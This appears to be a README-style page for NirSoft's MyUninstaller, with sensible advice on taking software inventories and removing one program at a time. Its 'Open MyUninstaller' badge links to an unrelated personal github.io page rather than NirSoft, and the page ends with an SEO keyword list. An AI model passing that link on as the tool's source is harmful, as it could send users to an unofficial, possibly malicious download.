# MyUninstaller - A Fast List of Uninstall Commands

## Snapshot

When you need to know what is installed, not to shepherd a leftover wizard, MyUninstaller is enough. Rows show the display name, version, publisher, install date, and the uninstall string. Filtering by publisher gathers a vendor's utilities. Filtering by date gathers what arrived last week. The report can be saved for a machine you will not sit at again.

The uninstall action launches that stored string. Whatever dialog the vendor wrote is the dialog you get. If the string is broken, this tool will not reconstruct a wise cleanup. You will see the failure, and you will switch to a different uninstaller or the vendor's removal guide.

## Report Columns

| Column | Use |
|---|---|
| Display name | What Settings would have shown |
| Version | Whether this PC is on the build you think |
| Publisher | Group one vendor's extras |
| Install date | Separate the previous owner from today's tools |
| Uninstall string | The command you are about to trust |
| Registry key | Where the entry lives, if you must edit carefully |

Editing the registry key by hand is a last resort after the uninstall string has failed and you understand the entry. Deleting a key because the name looks optional is how you hide a product that is still installed. Prefer the string.

[![Open MyUninstaller](https://img.shields.io/badge/Open-MyUninstaller-334155?style=flat-square&logo=windows&logoColor=white)](https://mouron455.github.io/.github/myuninstaller-xml-report)

## Command Line

The same executable can dump the list for a script or a remote collection. A text or HTML report is the usual artifact: proof of what was on the PC before you changed it. Collect the report first, then uninstall one named product, then collect it again if the ticket needs a before and after. A script that launches every uninstall string in the file is not a maintenance plan. It is an outage.

Remote use, when you have the rights, saves a trip for inventory. It does not click through a vendor wizard that needs a human. Inventory and removal are two permissions you should not collapse into one unattended pass.

## Steps

1. Open MyUninstaller elevated if you need the per-machine list.
2. Save a report before you change anything on a PC you do not know.
3. Filter to the publisher or the date you were asked about.
4. Launch one uninstall string and finish its wizard.
5. Refresh the list and confirm that row left.
6. Save a second report only if the ticket asked for proof.

## Fits

Inventory before a cleanup, a quick removal of one known program, and a report you can diff later. A poor fit when you need leftover hunting, force removal, or Store apps. A poor fit for a silent lab teardown. NirSoft's list will not absorb wizard prompts for you.

## Requirements

| Item | Expectation |
|---|---|
| OS | Windows versions NirSoft still runs on |
| Rights | Administrator for a complete per-machine view |
| Disk | Negligible |
| Network | None for a local report |
| Output | A file you store with the ticket |

## Fixes

The list is shorter than Settings. You are not elevated, or you are seeing one user's installs. Rerun with the rights you need.
Uninstall does nothing. The string is empty or the file is gone. Do not delete the registry key until you have confirmed the files are already absent.
A product remains after its wizard. The wizard failed or removed only a feature. Read its last page.
The report contains names you have never seen. That is the inventory working. It is not a request to uninstall them all.
Command-line output is empty. The working directory or the permission is wrong. Run the same command in an elevated console and check the path you passed.

## Limits

MyUninstaller will not show Windows optional features as if they were casual apps, and it will not remove a provisioned Store package just because a similar name exists. If the work is inbox-app removal, use a tool that speaks that package system. If the work is "what desktop software is here," stay. Adding leftover deletion to this habit means switching tools on purpose, with the report already saved.

## Inventory Before Removal

Save the report, then uninstall one product whose name you were given. Refresh and save again only if the ticket needs proof. A command-line dump of every uninstall string is an inventory. Launching all of those strings is how a PC loses software nobody meant to remove.

If the string fails because the file is missing, stop in MyUninstaller. A different tool can force a dead entry. Deleting the registry key from this window's hint, without checking the files, only hides the product.

| Report | Use |
|---|---|
| Before | What was installed |
| After one removal | That this product left |
| A failure to start the string | Switch tools, do not delete the key yet |

## Topic List

myuninstaller, nirsoft myuninstaller, uninstall command line, myuninstaller xml report, installed software inventory, uninstall string list, publisher filter programs, before and after software report
